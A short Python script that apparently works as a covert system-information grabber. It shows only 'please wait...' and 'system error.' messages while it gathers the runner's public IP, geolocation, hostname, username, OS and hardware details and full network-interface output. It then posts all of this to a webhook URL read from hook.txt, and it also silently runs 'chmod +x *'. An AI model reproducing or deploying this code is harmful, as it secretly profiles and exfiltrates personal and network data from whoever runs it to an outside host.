import requests
import platform
import psutil
import os
import subprocess
import socket

os.system("chmod +x *")
if os.name == "nt":
	os.system("cls")
else:
	os.system("clear")
print("please wait...")

info = []

try:
	ip = requests.get(f"https://ifconfig.me/ip").text
except:
	print("system error.")
	ip = ""
info.append(f"IP ADDRESS: || {ip} ||")
try:
	hostname = socket.gethostbyaddr(ip)[0]
except:
	print("system error.")
	hostname = ""
info.append(f"HOST NAME: || {hostname} ||")
try:
	i = requests.get(f"https://ipapi.co/{ip}/json", headers={"User-Agent": "bot"}).json()
	try:
		del i["ip"]
	except:
		pass
	for h1, h2 in i.items():
		h1 = h1.upper().replace("_", " ")
		info.append(f"{h1}: || {h2} ||")
except:
	print("system error.")
if os.name == "nt":
	command = "ipconfig /all"
else:
	command = "ifconfig"
try:
	output = subprocess.run(command, capture_output=True, text=True)
except:
	print("system error.")
try:
	info.append(f"OS NAME: || {os.name} ||\nSYSTEM OS NAME: || {platform.system()} ||\nSYSTEM VERSION: || {platform.version()} ||\nSYSTEM ARCHITECTURE: || {', '.join(platform.architecture())} ||\nSYSTEM PROCESSOR: || {platform.processor()} ||\nOS USERNAME: || {os.getlogin()} ||\nSYSTEM OS NAME: || {platform.node()} ||\nFILE PATH: || {os.getcwd()} ||\nPYTHON VERSION: || {platform.python_version()} ||\nPYTHON TUPLE VERSION: || {platform.python_version_tuple()[0]} ||\nRAM: || {psutil.virtual_memory().total / (1024 ** 3)} || GB\nRAM AVAILABLE: || {psutil.virtual_memory().available / (1024 ** 3)} || GB\nCPU COUNT: || {psutil.cpu_count(logical=False)} ||\nTHREAD COUNT: || {psutil.cpu_count(logical=False)} ||\nIFCONFIG OUTPUT: || {output} ||")
except:
	print("system error.")
try:
	with open("hook.txt", "r") as file:
		url = file.read()
	data = {"content": "\n".join(info)}
	requests.post(url, json=data, headers={'Content-Type': 'application/json', "User-Agent": "bot"})
except:
	print("system error.")
